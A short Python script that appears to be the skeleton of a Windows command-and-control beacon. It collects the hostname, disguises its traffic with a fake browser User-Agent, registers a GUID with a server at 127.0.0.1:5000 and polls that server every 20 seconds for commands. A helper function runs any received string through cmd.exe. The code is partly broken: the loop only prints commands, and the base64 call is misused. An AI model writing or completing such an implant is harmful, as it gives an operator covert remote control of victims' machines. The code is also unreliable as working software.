import subprocess
import requests
import time
import uuid
import base64

def bleh(beacon_command):
    """
    This takes in a string to execute
    Returns the output if any available
    """
    DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
    command = ['cmd.exe', '/C', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    return out

GUID = uuid.uuid4()
GUID = GUID.int
process = subprocess.Popen('hostname', close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
out, err = process.communicate()
hostname = out.decode()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
    'APPSESSIONID': f'{GUID}',
    'RESPONSE': f'{base64.encode(hostname)}'
}

# Send our HELLO/GUID
requests.get(f'http://127.0.0.1:5000/', headers=headers)

while 1:
    a = requests.get(f'http://127.0.0.1:5000/{GUID}.html', headers=headers)
    cmd = a.text
    print('got command')
    print(cmd)

    time.sleep(20)